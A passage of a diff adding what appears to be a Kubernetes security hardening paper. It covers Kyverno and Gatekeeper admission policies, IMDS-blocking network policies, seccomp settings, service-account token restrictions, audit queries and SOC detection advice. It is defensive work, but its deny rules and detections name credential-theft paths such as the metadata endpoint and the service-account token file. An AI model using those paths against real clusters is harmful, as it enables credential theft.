+            kinds: [&quot;DaemonSet&quot;, &quot;Deployment&quot;, &quot;StatefulSet&quot;]
+      exclude:
+        any:
+        - resources:
+            namespaces:
+              - &quot;kube-system&quot;
+              - &quot;kube-public&quot;
+      validate:
+        cel:
+          expressions:
+            - expression: &gt;
+                !has(object.spec.template.spec.volumes) ||
+                object.spec.template.spec.volumes.all(v, !has(v.hostPath))
+              message: &quot;hostPath volumes are not permitted in workload controllers.&quot;
+
+    # Approved registry with digest pin — Pod
+    # CRITICAL: kube-system and kube-public must be excluded.
+    # Platform components (CoreDNS, kube-proxy, aws-node) pull from upstream registries
+    # (registry.k8s.io, ECR public) that do not match the internal registry pattern.
+    # Enforcing without exclusions will block node provisioning and cluster upgrades.
+    - name: require-approved-registry-pod
+      match:
+        any:
+        - resources:
+            kinds: [&quot;Pod&quot;]
+      exclude:
+        any:
+        - resources:
+            namespaces:
+              - &quot;kube-system&quot;
+              - &quot;kube-public&quot;
+      validate:
+        message: &quot;Image must be from the approved registry with a digest pin.&quot;
+        foreach:
+        # containers, initContainers, and ephemeralContainers are all validated.
+        # Omitting any one of these lists leaves a bypass path: an attacker can
+        # run an unapproved image as an initContainer or ephemeralContainer and
+        # completely circumvent the registry constraint.
+        - list: &quot;request.object.spec.containers&quot;
+          pattern:
+            image: &quot;registry.company.internal/*@sha256:*&quot;
+        - list: &quot;request.object.spec.initContainers&quot;
+          pattern:
+            image: &quot;registry.company.internal/*@sha256:*&quot;
+        - list: &quot;request.object.spec.ephemeralContainers&quot;
+          pattern:
+            image: &quot;registry.company.internal/*@sha256:*&quot;
+
+    # Approved registry with digest pin — workload controllers
+    # CRITICAL: same kube-system exclusion required as for the Pod rule above.
+    - name: require-approved-registry-controllers
+      match:
+        any:
+        - resources:
+            kinds: [&quot;DaemonSet&quot;, &quot;Deployment&quot;, &quot;StatefulSet&quot;]
+      exclude:
+        any:
+        - resources:
+            namespaces:
+              - &quot;kube-system&quot;
+              - &quot;kube-public&quot;
+      validate:
+        message: &quot;Image must be from the approved registry with a digest pin.&quot;
+        foreach:
+        # All three container lifecycle lists must be validated — see note above.
+        - list: &quot;request.object.spec.template.spec.containers&quot;
+          pattern:
+            image: &quot;registry.company.internal/*@sha256:*&quot;
+        - list: &quot;request.object.spec.template.spec.initContainers&quot;
+          pattern:
+            image: &quot;registry.company.internal/*@sha256:*&quot;
+        - list: &quot;request.object.spec.template.spec.ephemeralContainers&quot;
+          pattern:
+            image: &quot;registry.company.internal/*@sha256:*&quot;
+</code></pre>
+<hr />
+<h4 id="opa-gatekeeper-restrict-clusterrolebinding-to-cluster-admin">OPA Gatekeeper — Restrict ClusterRoleBinding to cluster-admin</h4>
+<p><em>What this blocks:</em> Any ClusterRoleBinding that grants <code>cluster-admin</code> to a subject not in the approved list. Each unapproved subject generates a separate violation, preventing a mixed approved/unapproved subject set from passing.<br />
+<em>What this does not block:</em> Privilege escalation paths that do not create cluster-admin bindings; bindings created before this policy was installed; direct etcd or kubelet manipulation.<br />
+<em>Platform caveats:</em> Gatekeeper must be installed and operating in Enforce mode. Applies equally across EKS, AKS, and GKE managed control planes.</p>
+<blockquote>
+<p><strong>Why <code>subject.kind</code> must be validated alongside <code>subject.name</code>:</strong> Kubernetes RBAC subject names are scoped to their <code>kind</code> — they are not globally unique. An attacker can create a <code>ServiceAccount</code> named <code>system:kube-controller-manager</code> in any namespace and bind it to <code>cluster-admin</code>. A policy that only checks <code>subject.name</code> will treat this attacker-controlled ServiceAccount as approved. The Rego below enforces both <code>subject.kind</code> and <code>subject.name</code> so that the allowlist cannot be bypassed by name collision across kinds.</p>
+</blockquote>
+<pre><code class="language-yaml">apiVersion: templates.gatekeeper.sh/v1beta1
+kind: ConstraintTemplate
+metadata:
+  name: k8sblockclusteradminbinding
+spec:
+  crd:
+    spec:
+      names:
+        kind: K8sBlockClusterAdminBinding
+  targets:
+    - target: admission.k8s.gatekeeper.sh
+      rego: |
+        package k8sblockclusteradminbinding
+
+        # Iterate over every subject; generate a violation for EACH unapproved one.
+        # A binding containing one approved subject and one unapproved subject
+        # still produces a violation — preventing partial-bypass of the allowlist.
+        violation[{&quot;msg&quot;: msg}] {
+          input.review.kind.kind == &quot;ClusterRoleBinding&quot;
+          input.review.object.roleRef.name == &quot;cluster-admin&quot;
+          subject := input.review.object.subjects[_]
+          not is_approved_subject(subject)
+          msg := sprintf(
+            &quot;ClusterRoleBinding to cluster-admin is not permitted for %v '%v'&quot;,
+            [subject.kind, subject.name]
+          )
+        }
+
+        # Each approved subject is matched on BOTH kind AND name.
+        # Matching name alone allows a ServiceAccount named &quot;system:kube-controller-manager&quot;
+        # to bypass this policy — subject names are not globally unique across kinds.
+        is_approved_subject(subject) {
+          subject.kind == &quot;User&quot;
+          subject.name == &quot;system:kube-controller-manager&quot;
+        }
+        is_approved_subject(subject) {
+          subject.kind == &quot;User&quot;
+          subject.name == &quot;system:kube-scheduler&quot;
+        }
+        is_approved_subject(subject) {
+          subject.kind == &quot;User&quot;
+          subject.name == &quot;eks:cluster-bootstrap&quot;
+        }
+---
+apiVersion: constraints.gatekeeper.sh/v1beta1
+kind: K8sBlockClusterAdminBinding
+metadata:
+  name: block-cluster-admin-binding
+spec:
+  match:
+    kinds:
+      - apiGroups: [&quot;rbac.authorization.k8s.io&quot;]
+        kinds: [&quot;ClusterRoleBinding&quot;]
+</code></pre>
+<hr />
+<h3 id="42-network-policy-block-imds-and-constrain-egress">4.2 Network Policy: Block IMDS and Constrain Egress</h3>
+<p><em>What this blocks:</em> EC2 IMDS credential theft from application pods on EC2-backed nodes (SCARLETEEL Phase 3); cryptomining pool connections; C2 callbacks and exfiltration to arbitrary public IPs.<br />
+<em>What this does not block:</em> Attacks completing entirely within the cluster without external connectivity; IMDS access from pods with <code>hostNetwork: true</code> (prevent those via admission control); lateral movement using already-obtained credentials.<br />
+<em>Platform caveats:</em> Network policies require a CNI that enforces them (Calico, Cilium, VPC CNI with policy support). EKS Auto Mode uses VPC CNI; verify Network Policy enforcement capability for your version.</p>
+<blockquote>
+<p><strong>Fargate IMDS architecture note:</strong> EKS Fargate does <strong>not</strong> use the EC2 Instance Metadata Service (<code>169.254.169.254</code>) — there is no local metadata IP endpoint involved in credential delivery. EKS Fargate delivers AWS credentials exclusively through <strong>IAM Roles for Service Accounts (IRSA)</strong> via OIDC federation. At pod startup, the Fargate data plane injects two environment variables (<code>AWS_WEB_IDENTITY_TOKEN_FILE</code> and <code>AWS_ROLE_ARN</code>) and mounts a projected web identity token file. The AWS SDK reads those variables and calls the regional <strong>STS endpoint</strong> (e.g., <code>sts.amazonaws.com</code>) directly over HTTPS to exchange the projected token for temporary IAM credentials. No link-local metadata IP is involved at any step. A network policy blocking <code>169.254.169.254</code> has zero effect on EKS Fargate credential delivery. For Fargate, credential hygiene means scoping each IRSA IAM role to the minimum required permissions, auditing OIDC trust policies for overly broad conditions, and rotating or bounding token lifetimes via projected volume <code>expirationSeconds</code> — not network-layer IMDS blocking.</p>
+<p><strong>Detection opportunity on Fargate:</strong> Although Fargate does not use IMDS, attacker tooling executing inside a compromised Fargate container will still attempt to reach <code>169.254.169.254</code> — generic cloud-exploitation frameworks probe it unconditionally as part of credential-harvesting routines. These connection attempts will fail at the network layer, but the failed/blocked flows are recorded in <strong>VPC Flow Logs</strong> as <code>REJECT</code> records toward <code>169.254.169.254</code>. Monitoring VPC Flow Logs for outbound REJECT events to that destination from Fargate pod ENIs is a <strong>high-fidelity detection signal</strong>: legitimate Fargate workloads have no reason to initiate connections to that address. A <code>REJECT</code> record toward <code>169.254.169.254</code> from a Fargate task ENI is effectively a near-zero false-positive indicator of attacker reconnaissance tooling executing inside the container.</p>
+</blockquote>
+<h4 id="block-ec2-imds-for-non-system-pods-ec2-nodes-only-not-applicable-to-fargate">Block EC2 IMDS for Non-System Pods (EC2 nodes only — not applicable to Fargate)</h4>
+<blockquote>
+<p><strong>Scope:</strong> This policy blocks access to the EC2 Instance Metadata Service at <code>169.254.169.254</code>. It applies only to pods running on EC2 worker nodes. EKS Fargate pods do not use any local metadata IP endpoint — credentials are delivered via IRSA/OIDC with direct STS calls — and are therefore unaffected by and do not benefit from this rule.</p>
+</blockquote>
+<pre><code class="language-yaml">apiVersion: cilium.io/v2
+kind: CiliumClusterwideNetworkPolicy
+metadata:
+  name: block-imds-access
+spec:
+  endpointSelector:
+    matchExpressions:
+      - key: k8s:io.kubernetes.pod.namespace
+        operator: NotIn
+        values:
+          - kube-system    # aws-node and similar require IMDS access
+  egressDeny:
+    - toCIDRSet:
+        - cidr: 169.254.169.254/32
+</code></pre>
+<p><strong>EKS Pod Identity and IMDS interaction:</strong> EKS Pod Identity reduces the blast radius of IMDS credential theft by issuing credentials scoped to the requesting pod's Service Account rather than the full node IAM role <a href="https://docs.aws.amazon.com/eks/latest/userguide/pod-id-how-it-works.html">[R19]</a>. However, AWS documents that Pod Identity operates by intercepting IMDS calls through the SDK credential chain. Pods using <code>hostNetwork: true</code> retain direct IMDS access because they share the host network namespace <a href="https://docs.aws.amazon.com/eks/latest/userguide/pod-id-how-it-works.html">[R19]</a>. Pod Identity also does not eliminate the underlying IMDS endpoint for other callers. It reduces exposure but does not make IMDS harvesting impossible. The network-level IMDS block above is a complementary control and should be applied regardless.</p>
+<blockquote>
+<p><strong>Fargate:</strong> EKS Pod Identity is not supported on Fargate <a href="https://docs.aws.amazon.com/eks/latest/userguide/pod-id-how-it-works.html">[R19]</a>. Use IRSA (IAM Roles for Service Accounts) for Fargate workloads requiring AWS IAM access.</p>
+</blockquote>
+<h4 id="namespace-default-deny-with-approved-egress">Namespace Default-Deny with Approved Egress</h4>
+<pre><code class="language-yaml">apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-all
+  namespace: production
+spec:
+  podSelector: {}
+  policyTypes:
+    - Ingress
+    - Egress
+---
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-approved-egress
+  namespace: production
+spec:
+  podSelector: {}
+  policyTypes:
+    - Egress
+  egress:
+    - ports:
+        - protocol: UDP
+          port: 53
+        - protocol: TCP
+          port: 53
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: internal-services
+      ports:
+        - protocol: TCP
+          port: 8080
+</code></pre>
+<hr />
+<h3 id="43-seccomp-and-apparmor-syscall-level-restriction">4.3 Seccomp and AppArmor: Syscall-Level Restriction</h3>
+<p><em>What this blocks:</em> <code>setuid</code>/<code>setgid</code> abuse via <code>allowPrivilegeEscalation</code>; dropper file writes to the container root filesystem. <code>RuntimeDefault</code> Seccomp reduces the available syscall surface and may reduce exploitability of some container escape paths; the specific interaction with any individual CVE requires per-CVE analysis against the exact allowed syscall profile. The primary mitigation for the runc CVEs covered in this paper is patching runc, not Seccomp configuration.<br />
+<em>What this does not block:</em> Vulnerabilities that operate within the allowed syscall set; attacks by processes that have already escaped container isolation; application-layer vulnerabilities.<br />
+<em>Platform caveats:</em> Seccomp <code>RuntimeDefault</code> is available on EKS (EC2 and Auto Mode), AKS, and GKE. Fargate does not support privileged containers but its Seccomp behavior should be validated against AWS Fargate documentation for the version in use.</p>
+<h4 id="2025-runc-cves-prerequisites-and-scope">2025 runc CVEs — Prerequisites and Scope</h4>
+<p>All three vulnerabilities require an attacker to already have code execution inside a container. None are remotely exploitable in isolation <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31133">[R6]</a>.</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Mechanism</th>
+<th>Prerequisites</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2025-31133</td>
+<td>Bind-mount masking race condition</td>
+<td>Local container context; specific bind-mount configuration required <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31133">[R6]</a></td>
+</tr>
+<tr>
+<td>CVE-2025-52565</td>
+<td><code>/dev/console</code> device exploitation</td>
+<td>Local container context; container with <code>/dev/console</code> accessible <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31133">[R6]</a></td>
+</tr>
+<tr>
+<td>CVE-2025-52881</td>
+<td>Shared-mount propagation race condition</td>
+<td>Local container context; mount namespace conditions required <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31133">[R6]</a></td>
+</tr>
+</tbody>
+</table>
+<p>Applying <code>RuntimeDefault</code> Seccomp reduces attack surface and may reduce exploitability for some of these escape paths; the specific syscall-level benefit for each CVE has not been independently verified in this paper. The primary mitigation for all three is upgrading runc to a patched version.</p>
+<pre><code class="language-yaml"># Kubernetes &gt;= v1.30: AppArmor is specified via securityContext.appArmorProfile [R24]
+# Kubernetes &lt; v1.30: use the annotation form instead:
+#   metadata.annotations:
+#     container.apparmor.security.beta.kubernetes.io/&lt;container-name&gt;: runtime/default
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hardened-workload
+  namespace: production
+spec:
+  securityContext:
+    seccompProfile:
+      type: RuntimeDefault
+    appArmorProfile:          # Kubernetes v1.30+ [R24]; use annotation on older clusters
+      type: RuntimeDefault
+    runAsNonRoot: true
+    runAsUser: 10001
+    fsGroup: 10001
+  containers:
+  - name: app
+    image: registry.company.internal/app@sha256:&lt;digest&gt;
+    securityContext:
+      allowPrivilegeEscalation: false
+      readOnlyRootFilesystem: true    # Blocks file-based dropper writes
+      capabilities:
+        drop:
+          - ALL
+        add:
+          - NET_BIND_SERVICE          # Add only what the application actually requires
+    volumeMounts:
+    - name: tmp-vol
+      mountPath: /tmp
+  volumes:
+  - name: tmp-vol
+    emptyDir: {}
+</code></pre>
+<hr />
+<h3 id="44-rbac-hardening-minimize-service-account-token-exposure">4.4 RBAC Hardening: Minimize Service Account Token Exposure</h3>
+<p><em>What this blocks:</em> Automatic credential injection into every pod — the SA token theft vector used by SCARLETEEL Phase 2 and Slow Pisces; eliminates the well-known credential path at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> for pods where API access is not required.<br />
+<em>What this does not block:</em> Attackers who separately request a new token via the API server after obtaining API access through another path; SA tokens stored in environment variables or Secrets rather than auto-mounted.<br />
+<em>Platform caveats:</em> Applies equally across all Kubernetes distributions and managed services. Projected tokens with short expiration are supported on EKS, AKS, GKE, and Fargate.</p>
+<p><strong>The structural problem:</strong> By default, the ServiceAccount admission controller injects a credential volume into every pod at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>. In modern Kubernetes (v1.22+), this is a TokenRequest-backed projected token with a bounded lifetime and automatic rotation <a href="https://kubernetes.io/docs/concepts/storage/projected-volumes/">[R25]</a> — not the older static Secret-based token used in pre-v1.22 behavior. Either way, any attacker with code execution inside a pod automatically has a usable credential to the kube-apiserver at a well-known path — unless <code>automountServiceAccountToken: false</code> is set on the ServiceAccount or the Pod. Microsoft's April 2025 analysis found that <strong>51% of workload identities were completely inactive</strong> <a href="https://www.microsoft.com/en-us/security/blog/2025/04/23/understanding-the-threat-landscape-for-kubernetes-and-containerized-assets/">[R1]</a>, making dormant SAs preferred persistence anchors for actors like Slow Pisces — because they generate no behavioral anomaly alerts.</p>
+<h4 id="disable-auto-mount-on-the-default-serviceaccount">Disable Auto-Mount on the Default ServiceAccount</h4>
+<pre><code class="language-yaml"># Apply to every namespace's default ServiceAccount
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: default
+  namespace: production
+automountServiceAccountToken: false
+</code></pre>
+<h4 id="short-lived-projected-tokens-for-pods-that-require-api-access">Short-Lived Projected Tokens for Pods That Require API Access</h4>
+<blockquote>
+<p><strong>Token lifetime note:</strong> <code>serviceAccountToken</code> projected volumes default to <code>expirationSeconds: 3600</code> (1 hour) with a minimum of 600 seconds (10 minutes) <a href="https://kubernetes.io/docs/concepts/storage/projected-volumes/">[R25]</a>. The kubelet automatically rotates these tokens before expiry. This is distinct from the older static ServiceAccount Secrets (now deprecated), which generated long-lived non-expiring tokens. Do not conflate the two models when assessing token exposure risk.</p>
+</blockquote>
+<pre><code class="language-yaml">apiVersion: v1
+kind: Pod
+metadata:
+  name: needs-api-access
+spec:
+  serviceAccountName: minimal-api-sa
+  automountServiceAccountToken: false
+  volumes:
+  - name: api-token
+    projected:
+      sources:
+      - serviceAccountToken:
+          path: token
+          expirationSeconds: 3600       # explicit 1-hour TTL; projected SA token default is 3600s (min 600s) [R25]
+          audience: &quot;https://kubernetes.default.svc&quot;
+  containers:
+  - name: app
+    image: registry.company.internal/app@sha256:&lt;digest&gt;
+    volumeMounts:
+    - name: api-token
+      mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+      readOnly: true
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: minimal-api-role
+  namespace: production
+rules:
+- apiGroups: [&quot;&quot;]
+  resources: [&quot;configmaps&quot;]
+  resourceNames: [&quot;app-config&quot;]    # Named resource access only — not a wildcard
+  verbs: [&quot;get&quot;]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: minimal-api-binding
+  namespace: production
+subjects:
+- kind: ServiceAccount
+  name: minimal-api-sa
+  namespace: production
+roleRef:
+  kind: Role
+  name: minimal-api-role
+  apiGroup: rbac.authorization.k8s.io
+</code></pre>
+<h4 id="audit-queries-to-surface-live-risk">Audit Queries to Surface Live Risk</h4>
+<pre><code class="language-bash"># Find ClusterRoleBindings granting cluster-admin to non-system ServiceAccounts
+kubectl get clusterrolebindings -o json | jq -r '
+  .items[] |
+  select(.roleRef.name == &quot;cluster-admin&quot;) |
+  .subjects[]? |
+  select(.kind == &quot;ServiceAccount&quot;) |
+  select(.namespace != &quot;kube-system&quot;) |
+  &quot;RISKY: \(.namespace)/\(.name)&quot;
+'
+
+# Find pods with auto-mounted SA tokens
+kubectl get pods -A -o json | jq -r '
+  .items[] |
+  select((.spec.automountServiceAccountToken // true) == true) |
+  &quot;\(.metadata.namespace)/\(.metadata.name) SA=\(.spec.serviceAccountName // &quot;default&quot;)&quot;
+'
+</code></pre>
+<hr />
+<h2 id="takeaways-for-the-soc">Takeaways for the SOC</h2>
+<p><strong>1. Enable Kubernetes audit logs and confirm they reach your SIEM before any other action.</strong><br />
+The default enablement state differs by platform: EKS requires explicit CloudWatch configuration; AKS requires enabling <code>kube-audit</code> in Diagnostic Settings; GKE requires explicit Data Access log enablement for sensitive operations. Without logs covering <code>serviceaccounts/token</code> creates at <code>RequestResponse</code> level, SA token theft as documented in Slow Pisces and SCARLETEEL is invisible.</p>
+<p><strong>2. Alert on <code>system:anonymous</code> in audit logs with zero suppression.</strong><br />
+Any event with <code>user.username == "system:anonymous"</code> is either misconfiguration or active exploitation. This is TeamTNT RBAC Buster's entry condition. On a correctly configured cluster, the false positive rate is zero.</p>
+<p><strong>3. Treat ClusterRoleBinding creation to <code>cluster-admin</code> as a P1 incident with an automated response playbook.</strong><br />
+RBAC Buster creates bindings that survive misconfiguration remediation. When this alert fires: suspend associated credentials immediately, audit all binding subjects, and review all pods created in the following 10 minutes.</p>
+<p><strong>4. Correlate pod exec (audit log) with outbound network connections (Rule 3a) as a sequence within 60 seconds.</strong><br />
+Neither signal alone produces high-confidence detections. A <code>curl</code> inside a container is normal; an outbound connection to a public IP is normal. Their sequence from the same container is the behavioral fingerprint of dropper staging in SCARLETEEL and Kinsing campaigns. Keep IMDS as a separate single-event alert (Rule 3b).</p>
+<p><strong>5. Deploy eBPF-based or equivalent kernel-level telemetry on every non-Fargate node.</strong><br />
+Kinsing's userland rootkit conceals processes from userspace enumeration. Kernel-level telemetry fires before userspace filtering. On Fargate, DaemonSets and privileged containers are unsupported by design <a href="https://docs.aws.amazon.com/eks/latest/userguide/fargate.html">[R18]</a>; EKS Pod Identity is also not available <a href="https://docs.aws.amazon.com/eks/latest/userguide/pod-id-how-it-works.html">[R19]</a>. Document the data-plane visibility gap and compensate with strict egress Network Policies and IMDS blocking.</p>
+<p><strong>6. Set <code>automountServiceAccountToken: false</code> on the default ServiceAccount in every namespace.</strong><br />
+This removes one default, well-known credential path from pods that do not need API access. It is a useful hardening step — the auto-mounted token is a primary initial pivot in SCARLETEEL Phase 2, Kinsing lateral movement, and Slow Pisces cluster pivoting — but it is not a decisive control over pod credential exposure. Attackers who obtain API server access through another route can still request a new token via the TokenRequest API, extract credentials mounted as Secrets, pull them from CI/CD systems, or obtain them through cloud IAM paths. Setting this field reduces the attack surface for one specific, well-documented vector; it does not close credential exposure as a class of risk. See the <code>What this does not block</code> note in Section 4.4.</p>
+<p><strong>7. Run admission controllers in <code>Enforce</code> mode before workloads reach production.</strong><br />
+Audit mode allows attacks to succeed and produces a log. The Kyverno policies in Section 4.1 deny privileged container patterns (SCARLETEEL), host namespace access, and <code>hostPath</code> volume abuse in non-system namespaces. They do <strong>not</strong> prevent the canonical TeamTNT-in-<code>kube-system</code> pattern — the sample policy excludes <code>kube-system</code> for operational safety. For that specific pattern, Rule 1b (audit log DaemonSet detection) is the primary signal; admission control is not the stopping control. Use separate rules for Pods and workload controllers — the container spec path differs (<code>spec.containers</code> vs <code>spec.template.spec.containers</code>).</p>
+<p><strong>8. Enumerate and revoke inactive ServiceAccount identities quarterly.</strong><br />
+Microsoft's April 2025 analysis found 51% of workload identities completely inactive <a href="https://www.microsoft.com/en-us/security/blog/2025/04/23/understanding-the-threat-landscape-for-kubernetes-and-containerized-assets/">[R1]</a>. Dormant SAs are preferred by Slow Pisces-style actors because there is no behavioral baseline to deviate from — they trigger no anomaly alerts. Query for SAs with no bound pods and no recent API server activity; revoke or scope-limit them.</p>
+<p><strong>9. Block IMDS access at the CNI layer for all non-system pods.</strong><br />
+SCARLETEEL's entire cross-account pivot relied on unrestricted IMDS access from a single compromised container. A CNI network policy blocking <code>169.254.169.254/32</code> for non-system pods severs this vector independent of application code. Note: pods with <code>hostNetwork: true</code> retain direct IMDS access through the host network namespace; prevent those via admission control (Section 4.1).</p>
+<p><strong>10. Test your detection logic quarterly against actual attacker technique artifacts.</strong><br />
+In a dedicated test namespace with all egress blocked: submit a pod manifest with <code>hostPID: true</code>. Verify that the admission controller rejects it and emits an audit event, that your audit log captures the attempt, and that your SIEM alert fires within SLA. Detection rules not exercised against real event patterns degrade silently.</p>
+<hr />
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping</h2>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>ID</th>
+<th>Actor(s)</th>
+<th>Primary Defensive Control</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Exploit Public-Facing Application</td>
+<td>T1190</td>
+<td>SCARLETEEL, Kinsing, React2Shell</td>
+<td>Rapid patching; runtime immutability</td>
+</tr>
+<tr>
+<td>Deploy Container</td>
+<td>T1610</td>
+<td>TeamTNT, SCARLETEEL</td>
+<td>Admission controller Enforce mode</td>
+</tr>
+<tr>
+<td>Container Administration Command</td>
+<td>T1609</td>
+<td>All actors</td>
+<td>Audit logging of <code>pods/exec</code>; alert on exec from unexpected principals</td>
+</tr>
+<tr>
+<td>Escape to Host</td>
+<td>T1611</td>
+<td>CVE-2024-21626, nsenter</td>
+<td>runc upgrade (primary); Seccomp <code>RuntimeDefault</code> (partial surface reduction)</td>
+</tr>
+<tr>
+<td>Steal Application Access Token</td>
+<td>T1528</td>
+<td>SCARLETEEL, Slow Pisces</td>
+<td><code>automountServiceAccountToken: false</code></td>
+</tr>
+<tr>
+<td>Unsecured Credentials: Files</td>
+<td>T1552.001</td>
+<td>SCARLETEEL</td>
+<td><code>readOnlyRootFilesystem</code>; deny <code>hostPath</code></td>
+</tr>
+<tr>
+<td>Unsecured Credentials: Cloud Metadata</td>
+<td>T1552.005</td>
+<td>SCARLETEEL, Kinsing</td>
+<td>Block IMDS at CNI; EKS Pod Identity / IRSA</td>
+</tr>
+<tr>
+<td>Valid Accounts: Cloud Accounts</td>
+<td>T1078.004</td>
+<td>SCARLETEEL, Slow Pisces</td>
+<td>CloudTrail anomaly detection; least-privilege IAM</td>
+</tr>
+<tr>
+<td>Account Manipulation</td>
+<td>T1098</td>
+<td>TeamTNT RBAC Buster</td>
+<td>Alert on <code>ClusterRoleBinding</code> to <code>cluster-admin</code>; OPA Gatekeeper deny</td>
+</tr>
+<tr>
+<td>Scheduled Task/Job: Container</td>
+<td>T1053.007</td>
+<td>TeamTNT</td>
+<td>Alert on DaemonSet creation; deny <code>hostPID</code>/<code>hostNetwork</code> via Kyverno</td>
+</tr>
+<tr>
+<td>Transfer Data to Cloud Account</td>
+<td>T1537</td>
+<td>SCARLETEEL</td>
+<td>Egress <code>NetworkPolicy</code>; S3 access logging</td>
+</tr>
+<tr>
+<td>Resource Hijacking</td>
+<td>T1496</td>
+<td>Kinsing, TeamTNT, LLMjacking</td>
+<td>Admission control; resource quotas; AI API usage monitoring</td>
+</tr>
+<tr>
+<td>Phishing: Spearphishing</td>
+<td>T1566</td>
+<td>Slow Pisces</td>
+<td>Security awareness training; MFA on email; sandbox email attachment inspection</td>
+</tr>
+<tr>
+<td>Masquerading</td>
+<td>T1036</td>
+<td>TeamTNT</td>
+<td>Registry allowlist; image digest pinning</td>
+</tr>
+<tr>
+<td>Rootkit</td>
+<td>T1014</td>
+<td>Kinsing</td>
+<td>Kernel-level telemetry (eBPF or equivalent)</td>
+</tr>
+<tr>
+<td>Indicator Removal: Clear History</td>
+<td>T1070.003</td>
+<td>SCARLETEEL</td>
+<td>K8s audit logs are independent of shell history</td>
+</tr>
+<tr>
+<td>Valid Accounts: Default Accounts</td>
+<td>T1078.001</td>
+<td>FAMOUS CHOLLIMA</td>
+<td>MFA on all remote access; zero-trust network access for developers</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="references">References</h2>
+<p>[R1] <a href="https://www.microsoft.com/en-us/security/blog/2025/04/23/understanding-the-threat-landscape-for-kubernetes-and-containerized-assets/">Understanding the threat landscape for Kubernetes and containerized assets | Microsoft Security Blog, April 23, 2025</a></p>
+<p>[R2] <a href="https://www.sysdig.com/blog/cloud-breach-terraform-data-theft">SCARLETEEL: Operation leveraging Terraform, Kubernetes, and AWS for data theft | Sysdig TRT</a></p>
+<p>[R3] <a href="https://unit42.paloaltonetworks.com/modern-kubernetes-threats/">Understanding Current Threats to Kubernetes Environments | Palo Alto Unit 42</a></p>
+<p>[R4] <a href="https://www.crowdstrike.com/en-us/resources/reports/threat-hunting-report/">2025 Threat Hunting Report | CrowdStrike</a></p>
+<p>[R5] <a href="https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack/">LLMjacking: Stolen Cloud Credentials Used in New AI Attack | Sysdig TRT</a></p>
+<p>[R6] NVD advisories: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31133">CVE-2025-31133</a> · <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52565">CVE-2025-52565</a> · <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-52881">CVE-2025-52881</a></p>
+<p>[R7] <a href="https://www.wiz.io/vulnerability-database/cve/cve-2024-21626">CVE-2024-21626 Impact, Exploitability, and Mitigation | Wiz</a></p>
+<p>[R8] <a href="https://www.aquasec.com/blog/leveraging-kubernetes-rbac-to-backdoor-clusters/">First-Ever Attack Leveraging Kubernetes RBAC to Backdoor Clusters | Aqua Nautilus</a></p>
+<p>[R9] <a href="https://techcommunity.microsoft.com/blog/microsoftdefendercloudblog/initial-access-techniques-in-kubernetes-environments-used-by-kinsing-malware/3697975">Initial Access Techniques in Kubernetes Environments Used by Kinsing Malware | Microsoft Defender for Cloud Blog</a></p>
+<p>[R10] <a href="https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/">Defending against CVE-2025-55182 (React2Shell) in React Server Components | Microsoft Security Blog</a></p>
+<p>[R11] <a href="https://www.cisecurity.org/benchmark/kubernetes">CIS Google Kubernetes Engine (GKE) Benchmark v1.5.0 | CIS</a></p>
+<p>[R12] <a href="https://falco.org/docs/setup/download/">Falco — Setup and Download | falco.org</a></p>
+<p>[R13] <a href="https://aquasecurity.github.io/tracee/latest/">Tracee Documentation | Aqua Security</a></p>
+<p>[R14] <a href="https://tetragon.io/docs/">Tetragon Documentation | tetragon.io</a></p>
+<p>[R15] <a href="https://learn.microsoft.com/en-us/azure/aks/monitor-aks">Monitor Azure Kubernetes Service with Azure Monitor | Microsoft Learn</a></p>
+<p>[R16] <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/audit-logging">Configure audit logs for Google Kubernetes Engine | Google Cloud</a></p>
+<p>[R17] <a href="https://aws.amazon.com/blogs/containers/getting-started-with-amazon-eks-auto-mode/">Getting started with Amazon EKS Auto Mode | AWS Containers Blog</a></p>
+<p>[R18] <a href="https://docs.aws.amazon.com/eks/latest/userguide/fargate.html">AWS Fargate for Amazon EKS — Considerations | AWS Documentation</a></p>
+<p>[R19] <a href="https://docs.aws.amazon.com/eks/latest/userguide/pod-id-how-it-works.html">How EKS Pod Identity works | AWS Documentation</a></p>
+<p>[R20] <a href="https://cloud.google.com/chronicle/docs/reference/udm-field-list">UDM Field List | Google Security Operations | Google Cloud</a></p>
+<p>[R21] <a href="https://cloud.google.com/chronicle/docs/yara-l/repeated-fields">Repeated Fields in YARA-L 2.0 | Google Security Operations | Google Cloud</a></p>
+<p>[R22] <a href="https://cloud.google.com/chronicle/docs/detection/yara-l-2-0-syntax">YARA-L 2.0 Language Syntax | Google Security Operations | Google Cloud</a></p>
+<p>[R23] <a href="https://sigmahq.io/sigma-specification/specification/sigma-correlation-rules-specification.html">Sigma Correlation Rules Specification | SigmaHQ</a></p>
+<p>[R24] <a href="https://kubernetes.io/docs/tutorials/security/apparmor/">Restrict a Container's Access to Resources with AppArmor | Kubernetes</a> — documents the <code>securityContext.appArmorProfile</code> field (v1.30+) and the deprecated annotation form for earlier versions</p>
